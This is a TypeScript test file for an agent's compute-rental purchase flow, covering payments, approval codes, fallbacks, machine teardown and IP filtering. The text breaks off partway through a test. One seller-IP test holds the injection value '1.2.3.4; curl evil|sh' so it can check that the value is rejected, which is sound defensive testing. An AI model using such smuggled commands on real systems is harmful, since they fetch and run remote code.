import { execFileSync } from "node:child_process";
import { createPrivateKey, createPublicKey, sign, verify } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { NETWORKS } from "./guard";
import { Journal } from "./journal";
import { MarketRun, probeable, type MarketRunDeps, type PurchaseRecord } from "./run";
import { SELLERS, SellerClient, type SellerConfig } from "./seller";
import { newSshKey } from "./sshkey";
import { base58Encode } from "./auth";
import { FAKE_PAY_TO, FakeProcessor, fakePayer, inProcess } from "./testing";
import { NO_FAULTS, TestSeller, type Faults } from "./testseller";
import type { Limits, MarketId, Need, Offer } from "./types";

const T0 = 1_700_000_000_000;
const NEED: Need = { kind: "cpu", vcpus: 1, ramGb: 1, vramGb: 0, hours: 1, regions: [], allowSpot: false };
const LIMITS: Limits = { budgetUsd: 1, rateUsdHr: 1 };
/** vc2-1c-1gb for 1 hour: 0.009027 x 1.15, rounded up to the next atomic unit */
const CHEAPEST_USD = 0.010382;

const dirs: string[] = [];
const payers: { calls: number }[] = [];
const processors: FakeProcessor[] = [];

afterEach(() => {
  vi.useRealTimers();
  // Invariant across every case in this file: never more than one signed payment, never more than one settle.
  for (const p of payers) expect(p.calls).toBeLessThanOrEqual(1);
  for (const p of processors) expect(p.settled).toBeLessThanOrEqual(1);
  payers.length = 0;
  processors.length = 0;
  for (const d of dirs.splice(0)) fs.rmSync(d, { recursive: true, force: true });
});

type Setup = {
  market?: MarketId;
  ask?: boolean;
  need?: Partial<Need>;
  limits?: Partial<Limits>;
  faults?: Partial<Faults>;
  noPayer?: boolean;
  wrap?: (f: typeof fetch) => typeof fetch;
  spotFeed?: () => Promise<Offer[]>;
  probePort?: (ip: string) => Promise<boolean>;
  activeAfterSec?: number;
  findPayment?: MarketRunDeps["findPayment"];
  payer?: ReturnType<typeof fakePayer>;
};

function setup(o: Setup = {}) {
  let t = T0;
  const now = () => t;
  const slept: number[] = [];
  const sleep = async (ms: number) => {
    slept.push(ms);
    t += ms;
  };
  const market = o.market ?? "test";
  const processor = new FakeProcessor(market === "real" ? { network: NETWORKS.real.caip2, asset: NETWORKS.real.usdc } : {});
  processors.push(processor);
  const config: SellerConfig = market === "real" ? { ...SELLERS.test, market: "real" } : SELLERS.test;
  const seller = new TestSeller({ processor, resourceUrl: `${config.baseUrl}/compute/provision`, now, activeAfterSec: o.activeAfterSec });
  seller.faults = { ...NO_FAULTS, ...o.faults };
  const payer = o.payer ?? fakePayer();
  payers.push(payer);
  const base = inProcess(seller);
  const client = new SellerClient(config, { fetch: o.wrap ? o.wrap(base) : base, signer: payer.signer, now, sleep });
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "market-run-"));
  dirs.push(dir);
  const journal = new Journal(path.join(dir, "purchases.jsonl"));
  const records: PurchaseRecord[] = [];
  let codes = 0;
  const deps: MarketRunDeps = {
    id: "run-1",
    market,
    seller: client,
    spotFeed: o.spotFeed,
    payer: o.noPayer ? null : payer,
    journal,
    need: { ...NEED, ...o.need },
    limits: { ...LIMITS, ...o.limits },
    askBeforePaying: o.ask ?? false,
    agent: { name: "Buyer", ansName: "buyer.agents.test" },
    keyDir: path.join(dir, "keys"),
    now,
    sleep,
    newCode: () => `code-${++codes}`,
    onRecord: (r) => records.push(r),
    probePort: o.probePort,
    findPayment: o.findPayment,
  };
  const run = new MarketRun(deps);
  const events = () => journal.all().map((e) => e.event);
  return { run, seller, client, processor, payer, journal, records, events, now, slept, advance: (ms: number) => (t += ms), dir };
}

/** A seller that never sees max_total_usd, so only the run's own guard stands in the way. */
const ignoresMaxTotal = (f: typeof fetch) =>
  (async (input: RequestInfo | URL, init?: RequestInit) => {
    if (typeof init?.body === "string" && init.body.includes("max_total_usd")) {
      const { max_total_usd, ...rest } = JSON.parse(init.body);
      void max_total_usd;
      return f(input, { ...init, body: JSON.stringify(rest) });
    }
    return f(input, init);
  }) as typeof fetch;

const waitPhase = (run: MarketRun, phase: string) => vi.waitFor(() => expect(run.view().phase).toBe(phase));

describe("newSshKey", () => {
  it("writes an OpenSSH ed25519 key with mode 0o600 and returns only the public line and path", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "market-key-"));
    dirs.push(dir);
    const { publicKey, privatePath } = newSshKey(path.join(dir, "keys"), "run-1");
    expect(publicKey).toMatch(/^ssh-ed25519 AAAAC3NzaC1lZDI1NTE5[A-Za-z0-9+/=]+ agent-rental$/);
    expect(path.isAbsolute(privatePath)).toBe(true);
    expect(fs.statSync(privatePath).mode & 0o777).toBe(0o600);
    const pem = fs.readFileSync(privatePath, "utf8");
    expect(pem.startsWith("-----BEGIN OPENSSH PRIVATE KEY-----\n")).toBe(true);
    expect(fs.readFileSync(`${privatePath}.pub`, "utf8").trim()).toBe(publicKey);

    // the private half really belongs to the public line
    const body = Buffer.from(pem.split("\n").slice(1, -2).join(""), "base64");
    expect(body.subarray(0, 15).toString("binary")).toBe("openssh-key-v1\0");
    const blob = Buffer.from(publicKey.split(" ")[1], "base64");
    const pub = blob.subarray(blob.length - 32);
    const seedAt = body.indexOf(Buffer.concat([Buffer.from([0, 0, 0, 64])]), body.indexOf(pub) + 32);
    const seed = body.subarray(seedAt + 4, seedAt + 36);
    const key = createPrivateKey({ key: Buffer.concat([Buffer.from("302e020100300506032b657004220420", "hex"), seed]), format: "der", type: "pkcs8" });
    const pubKey = createPublicKey({ key: Buffer.concat([Buffer.from("302a300506032b6570032100", "hex"), pub]), format: "der", type: "spki" });
    expect(verify(null, Buffer.from("x"), pubKey, sign(null, Buffer.from("x"), key))).toBe(true);

    expect(() => newSshKey(path.join(dir, "keys"), "run-1")).toThrow(); // never overwrites
    expect(() => newSshKey(dir, "../escape")).toThrow();
  });

  it.skipIf(!fs.existsSync("/usr/bin/ssh-keygen"))("is accepted by ssh-keygen", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "market-key-"));
    dirs.push(dir);
    const { publicKey, privatePath } = newSshKey(dir, "k");
    expect(execFileSync("/usr/bin/ssh-keygen", ["-y", "-f", privatePath], { encoding: "utf8" }).trim()).toBe(publicKey);
  });
});

describe("MarketRun happy path", () => {
  it("test market, no approval: ends ready, pays the quote once, journals intent, paid, active", async () => {
    const { run, payer, events, records, processor, seller } = setup();
    await run.start();
    const v = run.view();
    expect(v.phase).toBe("ready");
    expect(v.payment?.usd).toBe(CHEAPEST_USD);
    expect(v.payment?.tx).toBe("tx-1");
    expect(v.payment?.payer).toBe(payer.address);
    expect(events()).toEqual(["intent", "paid", "active"]);
    expect(records).toHaveLength(1);
    expect(records[0]).toMatchObject({ outcome: "accepted", plan: "vc2-1c-1gb", region: "ewr", usd: CHEAPEST_USD, tx: "tx-1" });
    const chosen = v.rows.filter((r) => r.state === "chosen");
    expect(chosen).toHaveLength(1);
    expect(chosen[0]).toMatchObject({ id: "vc2-1c-1gb", quoteUsd: CHEAPEST_USD, region: "ewr" });
    expect(payer.calls).toBe(1);
    expect(processor.settled).toBe(1);
    expect(v.sources).toEqual([{ name: "Test seller (devnet, simulated machines)", ok: true, count: expect.any(Number), note: null }]);
    expect(v.machine).toMatchObject({ status: "active", port22: "not checked", plan: "vc2-1c-1gb", region: "ewr" });
    expect(v.machine?.ip).toMatch(/^203\.0\.113\./);
    expect(seller.machines.get(v.machine!.id)?.destroyed).toBe(false);
    expect(v.approval).toBeNull();
    expect(v.paidAt).not.toBeNull();
    expect(v.readyAt).not.toBeNull();
    expect(v.machine?.destroyAt).toBe(Math.min(v.paidAt! + 3600_000, v.machine!.expiresAt!));
  });

  it("view is JSON-safe, names the key only by path, and holds no private key", async () => {
    const { run } = setup();
    await run.start();
    const v = run.view();
    const text = JSON.stringify(v);
    expect(text).not.toMatch(/PRIVATE KEY/);
    const keyPath = /ssh -i (\S+) root@203\.0\.113\.\d+$/.exec(v.machine!.ssh!)![1];
    expect(fs.readFileSync(keyPath, "utf8")).toMatch(/OPENSSH PRIVATE KEY/);
    expect(fs.statSync(keyPath).mode & 0o777).toBe(0o600);
    expect(JSON.parse(text)).toEqual(v);
  });

  it("start() twice runs once", async () => {
    const { run, payer } = setup();
    await Promise.all([run.start(), run.start()]);
    expect(run.view().phase).toBe("ready");
    expect(payer.calls).toBe(1);
  });
});

describe("MarketRun approval", () => {
  it("rests at approval with a code; a wrong code is refused; the right one continues; a second approve is refused", async () => {
    const { run, payer, events } = setup({ ask: true });
    await run.start();
    const v = run.view();
    expect(v.phase).toBe("approval");
    expect(v.approval).toMatchObject({
      code: "code-1",
      usd: CHEAPEST_USD,
      atomic: "10382",
      token: "USDC",
      plan: "vc2-1c-1gb",
      region: "ewr",
      hours: 1,
      seller: "testseller",
      payTo: "Receiver11111111111111111111111111111111111",
    });
    expect(payer.calls).toBe(0);
    expect(events()).toEqual([]);

    expect(run.approve("code-2")).toMatchObject({ ok: false });
    expect(run.approve("")).toMatchObject({ ok: false });
    expect(run.view().phase).toBe("approval");
    expect(payer.calls).toBe(0);

    expect(run.approve("code-1")).toEqual({ ok: true });
    expect(run.approve("code-1")).toMatchObject({ ok: false });
    await waitPhase(run, "ready");
    expect(run.approve("code-1")).toMatchObject({ ok: false });
    expect(payer.calls).toBe(1);
    expect(events()).toEqual(["intent", "paid", "active"]);
  });

  it("real market always stops for approval, even with askBeforePaying false", async () => {
    const { run, payer } = setup({ market: "real", ask: false });
    await run.start();
    expect(run.view().phase).toBe("approval");
    expect(run.view().approval?.network).toContain("mainnet");
    expect(payer.calls).toBe(0);
  });

  it("a run paid from a connected wallet always stops for approval, names that wallet, and records it as the payer", async () => {
    const payer = Object.assign(fakePayer(), { funds: "Visitor1111111111111111111111111111111111111" });
    const { run } = setup({ ask: false, payer });
    void run.start();
    await waitPhase(run, "approval");
    expect(run.view().wallet).toBe(payer.funds);
    expect(payer.calls).toBe(0);
    // the code is checked without being used up, so the wallet's approval can be sent first
    const code = run.view().approval!.code;
    expect(run.awaiting("wrong")).toBeNull();
    expect(run.awaiting(code)?.atomic).toBe(run.view().approval!.atomic);
    expect(run.view().phase).toBe("approval");
    expect(run.approve(code)).toEqual({ ok: true });
    await waitPhase(run, "ready");
    // the money is the visitor's, the machine the agent's
    expect(run.view().payment?.payer).toBe(payer.funds);
    expect(payer.calls).toBe(1);
    expect(run.awaiting(code)).toBeNull();
  });

  it("a run paid by the agent's own wallet names no connected wallet", async () => {
    const { run } = setup();
    void run.start();
    await waitPhase(run, "ready");
    expect(run.view().wallet).toBeNull();
  });

  it("cancel at approval ends refused CANCELLED, no payment, no journal line", async () => {
    const { run, payer, events, records } = setup({ ask: true });
    expect(run.cancel()).toMatchObject({ ok: false }); // before start
    await run.start();
    expect(run.cancel()).toEqual({ ok: true });
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("CANCELLED");
    expect(run.approve("code-1")).toMatchObject({ ok: false });
    expect(run.cancel()).toMatchObject({ ok: false });
    expect(payer.calls).toBe(0);
    expect(events()).toEqual([]);
    expect(records).toEqual([expect.objectContaining({ outcome: "refused", reason: expect.stringContaining("CANCELLED"), plan: "vc2-1c-1gb", region: "ewr" })]);
  });

  it("cancel at ready is refused", async () => {
    const { run } = setup();
    await run.start();
    expect(run.cancel()).toMatchObject({ ok: false });
    expect(run.view().phase).toBe("ready");
  });
});

describe("MarketRun refusals and failures", () => {
  it("nothing fits: refused NOTHING_FITS with counts, payer never called, no journal lines", async () => {
    const { run, payer, events, records } = setup({ need: { vcpus: 64 } });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("refused");
    expect(v.refusal?.code).toBe("NOTHING_FITS");
    expect(v.leftOut).toEqual(expect.arrayContaining([expect.objectContaining({ reason: "TOO_SMALL" })]));
    expect(v.rows.every((r) => r.state === "left out")).toBe(true);
    expect(payer.calls).toBe(0);
    expect(events()).toEqual([]);
    expect(records).toEqual([expect.objectContaining({ outcome: "refused" })]);
  });

  it("no payer: failed with the wallet message before any intent", async () => {
    const { run, events, records } = setup({ noPayer: true });
    await run.start();
    await run.done;
    expect(run.view().phase).toBe("failed");
    expect(run.view().error).toContain("no wallet is set up for this market");
    expect(events()).toEqual([]);
    expect(records).toEqual([expect.objectContaining({ outcome: "failed" })]);
  });

  it("seller raises the price after quoting: refused OVER_QUOTE, payer never called, journal intent, failed", async () => {
    const { run, payer, events, records, processor } = setup({ faults: { quoteBumpPct: 20 } });
    await run.start();
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("OVER_QUOTE");
    expect(payer.calls).toBe(0);
    expect(processor.settled).toBe(0);
    expect(events()).toEqual(["intent", "failed"]);
    expect(records).toEqual([expect.objectContaining({ outcome: "refused", reason: expect.stringContaining("OVER_QUOTE") })]);
  });

  it("seller asks for another token: quotes fail WRONG_ASSET, and with all wrong the run fails", async () => {
    const { run, payer, events } = setup({ faults: { wrongAsset: true } });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    const failed = v.rows.filter((r) => r.state === "quote failed");
    expect(failed.length).toBeGreaterThan(0);
    expect(failed[0].code).toBe("WRONG_ASSET");
    expect(v.attempts.filter((a) => !a.ok)).toHaveLength(8); // gives up after 8 failed quotes
    expect(v.error).toContain("asked to be paid in SOL");
    expect(payer.calls).toBe(0);
    expect(events()).toEqual([]);
  });

  it("over budget at quote time: the seller's max_total_usd check answers PRICE_CAP and nothing is chosen", async () => {
    // between the chooser's estimate (0.01038105) and the seller's rounded-up quote (0.010382)
    const { run, payer } = setup({ limits: { budgetUsd: 0.0103815 } });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.rows.find((r) => r.id === "vc2-1c-1gb")).toMatchObject({ state: "quote failed", code: "PRICE_CAP" });
    expect(v.rows.some((r) => r.state === "chosen")).toBe(false);
    expect(payer.calls).toBe(0);
  });

  it("over budget at quote time with a seller that ignores max_total_usd: the guard fails it OVER_BUDGET", async () => {
    const { run, payer } = setup({ limits: { budgetUsd: 0.0103815 }, wrap: ignoresMaxTotal });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.rows.find((r) => r.id === "vc2-1c-1gb")).toMatchObject({ state: "quote failed", code: "OVER_BUDGET" });
    expect(v.rows.some((r) => r.state === "chosen")).toBe(false);
    expect(payer.calls).toBe(0);
  });

  it("over the hourly limit at quote time: the quote fails OVER_RATE and is not chosen", async () => {
    const { run, payer } = setup({ limits: { rateUsdHr: 0.0103815 } });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.rows.find((r) => r.id === "vc2-1c-1gb")).toMatchObject({ state: "quote failed", code: "OVER_RATE" });
    expect(payer.calls).toBe(0);
  });

  it("both sources failing ends failed", async () => {
    const { run } = setup({
      wrap: () => (async () => new Response("down", { status: 500 })) as typeof fetch,
      spotFeed: async () => {
        throw new Error("spot feed down");
      },
    });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.sources).toEqual([
      expect.objectContaining({ ok: false, count: 0, note: expect.stringContaining("500") }),
      expect.objectContaining({ ok: false, count: 0, note: "spot feed down" }),
    ]);
  });

  it("a failed spot feed is reported and does not stop the run", async () => {
    const { run } = setup({
      spotFeed: async () => {
        throw new Error("spot feed down");
      },
    });
    await run.start();
    expect(run.view().phase).toBe("ready");
    expect(run.view().sources.map((s) => s.ok)).toEqual([true, false]);
  });
});

describe("MarketRun fallback", () => {
  it("an out-of-stock region at quote time falls back to the next region", async () => {
    const { run } = setup({ faults: { outOfStockRegions: ["ewr"] } });
    await run.start();
    const v = run.view();
    expect(v.phase).toBe("ready");
    expect(v.machine).toMatchObject({ plan: "vc2-1c-1gb", region: "ord" });
    expect(v.attempts[0]).toMatchObject({ plan: "vc2-1c-1gb", region: "ewr", ok: false });
  });

  it("all regions out at quote time falls back to the next plan", async () => {
    const { run } = setup({ faults: { outOfStockRegions: ["ewr", "ord", "dfw", "sea"] } });
    await run.start();
    expect(run.view().phase).toBe("ready");
    expect(run.view().machine?.plan).toBe("do:s-1vcpu-1gb");
  });

  it("out of stock at pay time falls back to the next region with a new approval stop", async () => {
    const { run, seller, events, payer } = setup({ ask: true });
    await run.start();
    seller.faults = { ...seller.faults, outOfStockRegions: ["ewr"] };
    expect(run.approve("code-1")).toEqual({ ok: true });
    await waitPhase(run, "approval");
    expect(run.view().approval).toMatchObject({ code: "code-2", plan: "vc2-1c-1gb", region: "ord" });
    expect(run.approve("code-1")).toMatchObject({ ok: false }); // the old code is spent
    expect(run.approve("code-2")).toEqual({ ok: true });
    await waitPhase(run, "ready");
    expect(run.view().machine?.region).toBe("ord");
    expect(events()).toEqual(["intent", "failed", "intent", "paid", "active"]);
    expect(payer.calls).toBe(1);
  });

  it("all regions out at pay time falls back to the next plan", async () => {
    const { run, seller, events, payer } = setup({ ask: true });
    await run.start();
    seller.faults = { ...seller.faults, outOfStockRegions: ["ewr", "ord", "dfw", "sea"] };
    for (let i = 1; run.view().phase === "approval" && i < 10; i++) {
      expect(run.approve(`code-${i}`)).toEqual({ ok: true });
      await vi.waitFor(() => expect(["approval", "ready", "failed", "refused"]).toContain(run.view().phase));
    }
    expect(run.view().phase).toBe("ready");
    expect(run.view().machine?.plan).toBe("do:s-1vcpu-1gb");
    expect(events()).toEqual(["intent", "failed", "intent", "failed", "intent", "paid", "active"]);
    expect(payer.calls).toBe(1);
  });
});

describe("MarketRun never pays twice", () => {
  it("503 once: one payer call, one settle, ready", async () => {
    const { run, payer, processor } = setup({ faults: { fail5xxOnce: true } });
    await run.start();
    expect(run.view().phase).toBe("ready");
    expect(payer.calls).toBe(1);
    expect(processor.settled).toBe(1);
  });

  it("409 settlement_pending: adopts the machine from the instance list, one payer call", async () => {
    const { run, payer, events, seller } = setup({ faults: { settlementPending409: true } });
    await run.start();
    const v = run.view();
    expect(v.phase).toBe("ready");
    expect(payer.calls).toBe(1);
    expect(v.machine?.id).toBe([...seller.machines.keys()][0]);
    expect(events()).toEqual(["intent", "unknown", "paid", "active"]);
  });

  it("unknown and no machine appears: failed, one payer call, journal ends unknown", async () => {
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        const headers = new Headers(init?.headers);
        if (headers.has("PAYMENT-SIGNATURE")) return new Response("gateway timeout", { status: 504 });
        return f(input, init);
      }) as typeof fetch;
    const { run, payer, events, processor, records } = setup({ wrap });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.error).toBe(UNCHECKED_UNCLEAR);
    expect(v.spent).toBe("maybe");
    expect(payer.calls).toBe(1);
    expect(processor.settled).toBe(0);
    expect(events()).toEqual(["intent", "unknown"]);
    expect(records).toEqual([expect.objectContaining({ outcome: "failed" })]);
  });
});

describe("MarketRun final review (M2, M6)", () => {
  it("an unknown outcome when the machine list before paying could not be read: no machine is adopted (M6)", async () => {
    let lists = 0;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        const url = String(input instanceof Request ? input.url : input);
        if ((init?.method ?? "GET") === "GET" && url.endsWith("/compute/instances") && ++lists === 1) return new Response("busy", { status: 503 });
        return f(input, init);
      }) as typeof fetch;
    const { run, payer, events, seller } = setup({ faults: { settlementPending409: true }, wrap });
    await run.start();
    await run.done;
    const v = run.view();
    expect(seller.machines.size).toBe(1); // the seller did make one
    expect(v.phase).toBe("failed");
    expect(v.machine).toBeNull();
    expect(v.error).toBe(UNCHECKED_UNCLEAR);
    expect(v.spent).toBe("maybe");
    expect(payer.calls).toBe(1);
    expect(events()).toEqual(["intent", "unknown"]);
  });

  it("refuses to pay when the seller names the paying wallet as the fee payer (M2)", async () => {
    // the fake processor names FAKE_PAY_TO as fee payer; a wallet at that address would pay the fee
    const { run, payer, processor, events } = setup({ payer: fakePayer(FAKE_PAY_TO) });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("refused");
    expect(v.refusal).toEqual({ code: "WRONG_NETWORK", detail: "The seller asked your wallet to pay the network fee." });
    expect(v.spent).toBe("nothing");
    expect(payer.calls).toBe(0);
    expect(processor.settled).toBe(0);
    expect(events()).toEqual(["intent", "failed"]);
  });
});

/** Rewrites every instance's ip_address the seller sends back. */
const rewriteIp = (ip: string) => (f: typeof fetch) =>
  (async (input: RequestInfo | URL, init?: RequestInit) => {
    const r = await f(input, init);
    const url = String(input instanceof Request ? input.url : input);
    if (!/\/compute\/(instances|provision)/.test(url)) return r;
    const text = await r.text();
    let body: Record<string, unknown>;
    try {
      body = JSON.parse(text);
    } catch {
      return new Response(text, { status: r.status, headers: r.headers });
    }
    const fix = (m: unknown) => {
      if (m && typeof m === "object" && (m as { status?: string }).status === "active") (m as { ip_address: string }).ip_address = ip;
    };
    fix(body.instance);
    fix(body.order);
    if (Array.isArray(body.instances)) body.instances.forEach(fix);
    return new Response(JSON.stringify(body), { status: r.status, headers: r.headers });
  }) as typeof fetch;

describe("MarketRun seller-supplied IP", () => {
  for (const bad of ["1.2.3.4; curl evil|sh", "example.com"]) {
    it(`treats ${JSON.stringify(bad)} as no IP: never in the ssh line, never probed, times out`, async () => {
      const probePort = vi.fn(async () => true);
      const { run } = setup({ wrap: rewriteIp(bad), probePort });
      await run.start();
      await run.done;
      const v = run.view();
      expect(v.phase).toBe("failed");
      expect(v.error).toContain("did not become active");
      expect(v.machine).toMatchObject({ ip: null, ssh: null, status: "active" });
      expect(JSON.stringify(v)).not.toContain(bad);
      expect(probePort).not.toHaveBeenCalled();
      await run.destroy(); // clears the armed retry
      expect(run.view().phase).toBe("released");
    });
  }

  for (const local of ["127.0.0.1", "10.1.2.3", "172.16.0.9", "172.31.255.1", "192.168.1.20", "169.254.169.254", "0.1.2.3", "::1", "::", "fe80::1", "fd12:3456::1", "fc00::5", "::ffff:10.0.0.1"]) {
    it(`never probes the non-public address ${local}: port 22 is "not checked"`, async () => {
      const probePort = vi.fn(async () => true);
      const { run } = setup({ wrap: rewriteIp(local), probePort });
      await run.start();
      const v = run.view();
      expect(v.phase).toBe("ready");
      expect(probePort).not.toHaveBeenCalled();
      expect(v.machine?.port22).toBe("not checked");
      await run.destroy();
    });
  }

  it("still probes public addresses next to the private ranges", async () => {
    for (const ip of ["172.32.0.1", "11.0.0.1", "2606:4700:4700::1111"]) {
      const probePort = vi.fn(async () => false);
      const { run } = setup({ wrap: rewriteIp(ip), probePort });
      await run.start();
      expect(probePort).toHaveBeenCalledWith(ip);
      expect(run.view().machine?.port22).toBe("closed");
      await run.destroy();
    }
  });

  it("probes a valid routable IP and puts it in the ssh line", async () => {
    const probePort = vi.fn(async () => true);
    const { run } = setup({ wrap: rewriteIp("8.8.8.8"), probePort });
    await run.start();
    const v = run.view();
    expect(v.phase).toBe("ready");
    expect(probePort).toHaveBeenCalledWith("8.8.8.8");
    expect(v.machine).toMatchObject({ ip: "8.8.8.8", port22: "open" });
    expect(v.machine?.ssh).toMatch(/ root@8\.8\.8\.8$/);
  });
});

describe("probeable", () => {
  const notPublic: [string, string][] = [
    ["100.64.0.1", "shared address space (CGNAT) 100.64.0.0/10"],
    ["100.127.255.254", "top of 100.64.0.0/10"],
    ["192.0.0.8", "IETF protocol assignments 192.0.0.0/24"],
    ["192.0.2.10", "TEST-NET-1 192.0.2.0/24"],
    ["198.18.0.1", "benchmarking 198.18.0.0/15"],
    ["198.19.255.1", "top of 198.18.0.0/15"],
    ["198.51.100.7", "TEST-NET-2 198.51.100.0/24"],
    ["203.0.113.9", "TEST-NET-3 203.0.113.0/24"],
    ["224.0.0.251", "multicast 224.0.0.0/4"],
    ["239.255.255.250", "multicast 224.0.0.0/4"],
    ["240.0.0.1", "reserved 240.0.0.0/4"],
    ["255.255.255.255", "broadcast, in 240.0.0.0/4"],
    ["64:ff9b::a00:1", "NAT64 64:ff9b::/96"],
    ["2002:a00:1::1", "6to4 2002::/16"],
    ["2001:db8::7", "documentation 2001:db8::/32"],
    ["::a00:1", "IPv4-compatible ::/96"],
    ["ff02::1", "multicast ff00::/8"],
    ["::ffff:100.64.0.1", "IPv4-mapped CGNAT"],
    ["::ffff:192.168.1.1", "IPv4-mapped private"],
    ["::ffff:7f00:1", "IPv4-mapped loopback, hex spelling"],
    ["0:0:0:0:0:ffff:a00:1", "IPv4-mapped private, long spelling"],
    ["fe80::1%en0", "link-local with a zone id"],
    // IPv6 is an allowlist: only global unicast 2000::/3, minus the special blocks inside it
    ["::1", "loopback, outside 2000::/3"],
    ["::", "unspecified"],
    ["fe80::1", "link-local, outside 2000::/3"],
    ["fd00::1", "unique local, outside 2000::/3"],
    ["4000::1", "unassigned, outside 2000::/3"],
    ["1fff:ffff::1", "just below 2000::/3"],
    ["64:ff9b:1::a00:1", "local-use NAT64 64:ff9b:1::/48"],
    ["2001::1", "Teredo 2001::/32, in 2001::/23"],
    ["2001:1ff:ffff::1", "top of the IETF block 2001::/23"],
    ["2001:db8:ffff::1", "top of documentation 2001:db8::/32"],
    ["2002:808:808::1", "6to4 2002::/16 wrapping a public IPv4"],
    ["3fff::1", "documentation 3fff::/20"],
  ];
  for (const [ip, why] of notPublic) {
    it(`does not probe ${ip} (${why})`, () => expect(probeable(ip)).toBe(false));
  }
  for (const ip of ["8.8.8.8", "1.1.1.1", "100.128.0.1", "198.20.0.1", "223.255.255.1", "2606:4700:4700::1111", "::ffff:8.8.8.8", "2000::1", "2001:200::1", "2001:4860:4860::8888", "2003::1", "3ffe::1", "2a00:1450::1"]) {
    it(`probes the public address ${ip}`, () => expect(probeable(ip)).toBe(true));
  }
});

describe("MarketRun destroy", () => {
  it("destroy releases the machine and journals released; a second destroy is a no-op", async () => {
    const { run, seller, events } = setup();
    await run.start();
    const id = run.view().machine!.id;
    await run.destroy();
    await run.done;
    expect(run.view().phase).toBe("released");
    expect(run.view().releasedAt).not.toBeNull();
    expect(seller.machines.get(id)?.destroyed).toBe(true);
    expect(events()).toEqual(["intent", "paid", "active", "released"]);
    await run.destroy();
    expect(events()).toEqual(["intent", "paid", "active", "released"]);
  });

  it("a failed destroy keeps the machine visible and stays ready; a retry works", async () => {
    let failDelete = true;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        if (failDelete && init?.method === "DELETE") return new Response("nope", { status: 500 });
        return f(input, init);
      }) as typeof fetch;
    const { run, events } = setup({ wrap });
    await run.start();
    await run.destroy();
    expect(run.view().phase).toBe("ready");
    expect(run.view().machine).not.toBeNull();
    expect(run.view().error).toContain("500");
    failDelete = false;
    await run.destroy();
    expect(run.view().phase).toBe("released");
    expect(run.view().error).toBeNull();
    expect(events().at(-1)).toBe("released");
  });

  it("destroy asked for while the paid request is in flight destroys the machine as soon as it is known", async () => {
    let target: MarketRun | null = null;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        if (new Headers(init?.headers).has("PAYMENT-SIGNATURE")) {
          expect(target!.view().phase).toBe("paying");
          void target!.destroy();
        }
        return f(input, init);
      }) as typeof fetch;
    const { run, seller, events, records } = setup({ wrap });
    target = run;
    await run.start();
    await run.done;
    expect(run.view().phase).toBe("released");
    expect([...seller.machines.values()].every((m) => m.destroyed)).toBe(true);
    expect(events()).toEqual(["intent", "paid", "released"]);
    expect(records).toEqual([expect.objectContaining({ outcome: "accepted" })]);
  });

  it("destroy at the approval stop behaves like cancel", async () => {
    const { run, events, payer, records } = setup({ ask: true });
    await run.start();
    await run.destroy();
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("CANCELLED");
    expect(events()).toEqual([]);
    expect(payer.calls).toBe(0);
    expect(records).toEqual([expect.objectContaining({ outcome: "refused", plan: "vc2-1c-1gb", region: "ewr" })]);
  });

  it("destroy after approve but before the intent stops the run with nothing paid", async () => {
    const { run, events, payer, records } = setup({ ask: true });
    await run.start();
    expect(run.approve("code-1")).toEqual({ ok: true });
    await run.destroy();
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("STOPPED");
    expect(events()).toEqual([]);
    expect(payer.calls).toBe(0);
    expect(records).toHaveLength(1);
  });

  it("destroy during a not-charged attempt stops the run instead of buying a fallback", async () => {
    const { run, seller, events, payer, records, processor } = setup({ ask: true });
    await run.start();
    seller.faults = { ...seller.faults, outOfStockRegions: ["ewr"] };
    let target: MarketRun | null = null;
    const handle = seller.handle.bind(seller);
    seller.handle = async (req: Request) => {
      // the fresh 402 for the approved quote: the owner presses destroy while it is in flight
      if (req.method === "POST" && !req.headers.has("PAYMENT-SIGNATURE") && target) void target.destroy();
      return handle(req);
    };
    expect(run.approve("code-1")).toEqual({ ok: true });
    target = run;
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("STOPPED");
    expect(run.view().approval?.code).toBe("code-1"); // no new approval stop
    expect(events()).toEqual(["intent", "failed"]);
    expect(payer.calls).toBe(0);
    expect(processor.settled).toBe(0);
    expect(records).toEqual([expect.objectContaining({ outcome: "refused", reason: expect.stringContaining("STOPPED") })]);
  });

  it("destroy while the fresh 402 is in flight stops the run before anything is signed (I1)", async () => {
    let target: MarketRun | null = null;
    let unpaidPosts = 0;
    let phaseAtDestroy = "";
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        const url = String(input instanceof Request ? input.url : input);
        if (init?.method === "POST" && url.endsWith("/compute/provision") && !new Headers(init?.headers).has("PAYMENT-SIGNATURE") && target!.view().phase === "paying" && ++unpaidPosts === 1) {
          // the unpaid request made while paying is the fresh 402 just before signing: the owner presses destroy while it waits
          phaseAtDestroy = target!.view().phase;
          void target!.destroy();
          await new Promise((r) => setTimeout(r, 20));
        }
